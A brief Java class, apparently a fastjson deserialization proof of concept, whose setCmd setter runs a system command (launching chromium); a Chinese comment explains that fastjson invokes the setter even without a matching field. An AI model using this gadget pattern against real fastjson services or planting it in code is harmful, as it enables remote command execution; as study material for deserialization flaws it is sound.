package fastJsonHack;

import java.io.IOException;

public class hackerClass_bak {
    /**
     * 即使 class 里没有 cmd 这个变量，走 fastjson 依然可以正常解析
     * 参数需要唯一，满足传入一个任意参数 + 存在 set 就可以
     */
    public void setCmd(String cmd) throws IOException {
        Runtime.getRuntime().exec("chromium");
    }
}
